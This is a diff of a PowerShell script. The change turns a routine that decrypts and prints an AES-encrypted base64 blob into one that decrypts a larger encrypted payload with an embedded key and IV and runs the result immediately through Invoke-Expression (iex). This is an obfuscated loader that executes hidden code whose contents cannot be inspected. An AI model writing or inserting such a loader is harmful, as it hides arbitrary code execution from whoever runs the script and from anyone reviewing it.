@@ -1,15 +1,22 @@
-$k = [Convert]::FromBase64String("CKUQXurBkno1LFqfHsffMITHjZLaNyS8qV29Ji49wzM=")
-$i = [Convert]::FromBase64String("LF8fHjkRprgmJE7UiyOr1A==")
-$p = "ZpSwhcS8WakrWT0vyb9IS3PhL9R/051dyLUZBgnpC+Ql92gtj9yoZl9BnZz+rpKzcOwdW2I1j7pgMOQGydO4H5QoHZrQ7vwkHHroVxLsQtFiet5Ug0eSwqjXaL3WGSlRHyAjEVclsujZrPIC1Gemzg=="
+function D {
+    param($e, $k, $i)
+    $a = [System.Security.Cryptography.Aes]::Create()
+    $a.Key = $k
+    $a.IV = $i
+    $a.Padding = "PKCS7"
+    $d = $a.CreateDecryptor()
+    $b = [Convert]::FromBase64String($e)
+    $m = New-Object IO.MemoryStream
+    $c = New-Object Security.Cryptography.CryptoStream($m, $d, 'Write')
+    $c.Write($b, 0, $b.Length)
+    $c.Close()
+    [Text.Encoding]::UTF8.GetString($m.ToArray())
+}
 
-$a = [System.Security.Cryptography.Aes]::Create()
-$a.Key = $k
-$a.IV = $i
-$a.Padding = "PKCS7"
-$d = $a.CreateDecryptor()
-$b = [Convert]::FromBase64String($p)
-$m = New-Object IO.MemoryStream
-$c = New-Object Security.Cryptography.CryptoStream($m, $d, 'Write')
-$c.Write($b, 0, $b.Length)
-$c.Close()
-[Text.Encoding]::UTF8.GetString($m.ToArray())
+$k = [Convert]::FromBase64String("MWLR/AnZl1Hcjyfe5DgD43LdgkQtVISS28mCeNuRi9Q=")
+$i = [Convert]::FromBase64String("JIEvxYrJ4H/jObIrU3Ba9g==")
+$p = @"
++LviCQGCOUqt7TLTIEpsVZMh9kEgXxLQrLR9kiHZilQXfOXkiGv7m0jaNdUmjHbOrYtKTBcuaelEGQ3w2dUd09WsciqouXylWvJG/NYL7rk/nXFD7FbrB/w7eBhaFHDg5VPz5DJc36dInEC2cdmlertrz8iXMftadG5zHqRIOa3Fd9RFJUVSxpfCMsGYLFMP2bO1i9luJ8SkKPK/sfuRJ14Ps7t4Ksnr0/sb1/NMRvkBkn/qbXY6/jorfWpNuUZSuoM8+qMLyjBSoxRlgylVvnH8hO9F2brjforJ9OwG7/0QJik77xhk5DZhRsHpcP/dYRw+vCprfUGIsDYoudrsOSS0VCcclZjLgvf1X5+CGwLmUrLjdoTaZ+1l0jC/pZA8Y5QUDmSmeiNP1/Ob0zdVLMN47Kf1j6b5c/JHjZkW/B/oPb0doZa+6Uz7akn2h3JoJwAGwpHxhrn9TgQZPQkLIptkbluQJG6wVYwHK3u/hQbOOaMd0dVSbwIoq5xrJ/WDhGkyyp6psCJ5s9M4xnWhPubEwyINaMOfeEq0ukIH8mPev5pEplR5Ui7eYdyhyehnk34objZyJI/qzbLvqHaEWaegci0aFXjWxHwEydFh0fykqJPEQjh84oeAImXXlf1pf0hhgx3HgqsClPEXp+ph+ByXiLJuvoguRU10IN0SarKyF8FOWWjWs3F5QyPcGA0X56JUIX3U1JhJWxR4nxZVP0KiZaFmCZGlp9qYDDYPo3PB7XucRApxy8bfAT4D1Pb22yOI4gmvM36Jm7j1viB6CtChpbNNyNwqdYowZIeRrcJQ8TFyFkaL5+mrlldj/M0RagX9kWo95HaUszWBPf3lNhis3MBkZWD1O6huv4W5iPlQ0KDB6Y1/Hx1sQO8nBHu65SQrv+q8wVsj4jkv4j7Jx+B9dQP70E
+"@
+
+iex (D $p $k $i)
